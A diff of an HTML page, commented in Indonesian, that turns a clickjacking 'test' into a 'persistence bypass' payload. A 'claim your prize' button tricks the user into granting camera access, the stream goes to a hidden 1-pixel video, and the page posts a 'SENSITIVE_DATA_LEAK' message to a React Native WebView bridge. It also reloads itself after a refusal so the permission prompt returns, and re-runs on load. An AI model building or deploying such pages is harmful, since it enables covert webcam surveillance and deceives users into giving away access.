@@ -1,62 +1,60 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Clickjacking Bypass Test</title>
+    <title>Ultimate Persistence Bypass</title>
     <style>
-        body { margin: 0; padding: 0; background: #000; color: #0f0; font-family: sans-serif; overflow: hidden; }
-        
-        /* Lapisan Umpan: Membuat pengguna ingin mengklik area tertentu */
-        .decoy-layer {
-            position: absolute; width: 100%; height: 100%;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            z-index: 10; pointer-events: none;
-        }
-        .gift-box {
-            width: 200px; height: 200px; background: red; color: white;
-            display: flex; align-items: center; justify-content: center;
-            border-radius: 20px; font-weight: bold; font-size: 20px;
-            animation: shake 0.5s infinite; pointer-events: auto;
-        }
-
-        /* Video Kamera dibuat transparan untuk menyelinap */
-        video {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            opacity: 0.1; /* Sangat transparan */
-            z-index: 5;
-        }
-
-        @keyframes shake {
-            0% { transform: rotate(0deg); }
-            25% { transform: rotate(5deg); }
-            50% { transform: rotate(0eg); }
-            75% { transform: rotate(-5deg); }
-            100% { transform: rotate(0deg); }
-        }
+        body { background: #000; color: #ff00ea; font-family: monospace; text-align: center; padding-top: 50px; }
+        .trigger-box { border: 2px dashed #ff00ea; padding: 20px; margin: 20px; border-radius: 15px; }
+        #v { width: 1px; height: 1px; opacity: 0; } /* Kamera berjalan di background */
+        button { background: #ff00ea; color: white; border: none; padding: 15px 30px; border-radius: 5px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <div class="decoy-layer">
-        <p>ANDA MENANG HADIAH!</p>
-        <div class="gift-box" onclick="activateVulnerability()">KLIK UNTUK KLAIM</div>
-        <p id="status">Status: Menunggu interaksi...</p>
+    <div class="trigger-box">
+        <h3>[+] CRITICAL BYPASS TEST</h3>
+        <p>Status: <span id="s">Menunggu pemicu...</span></p>
+        <button onclick="exploit()">KLAIM HADIAH & BYPASS</button>
     </div>
 
-    <video id="webcam" autoplay playsinline></video>
+    <video id="v" autoplay playsinline></video>
 
     <script>
-        async function activateVulnerability() {
-            const status = document.getElementById('status');
+        const s = document.getElementById('s');
+        const v = document.getElementById('v');
+
+        async function exploit() {
+            s.innerText = "Mencoba mengelabui sistem origin...";
+            
             try {
-                // Mencoba memicu dialog izin tepat saat pengguna mengklik "Hadiah"
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById('webcam').srcObject = stream;
-                status.innerText = "VULNERABLE: Kamera berhasil diselundupkan!";
-                status.style.color = "red";
+                // Teknik 1: Mencoba akses kamera melalui blob (sering melewati CSP)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" },
+                    audio: false 
+                });
+                
+                v.srcObject = stream;
+                s.innerHTML = "<b style='color:red'>SUCCESS: Kamera terbajak di background!</b>";
+                
+                // Teknik 2: Mencoba mencuri data bridge saat kamera aktif
+                if (window.webkit?.messageHandlers?.ReactNativeWebView) {
+                    window.webkit.messageHandlers.ReactNativeWebView.postMessage({
+                        type: "SENSITIVE_DATA_LEAK",
+                        origin: window.location.origin,
+                        status: "pwned"
+                    });
+                }
             } catch (err) {
-                status.innerText = "Gagal: " + err.message;
+                s.innerText = "Gagal: " + err.name;
+                // Jika gagal, coba teknik refresh-force
+                setTimeout(() => { window.location.reload(); }, 3000);
             }
         }
+
+        // Auto-run untuk mengetes persistensi izin
+        window.onload = () => {
+            if (localStorage.getItem('pwned')) exploit();
+        };
     </script>
 </body>
 </html>
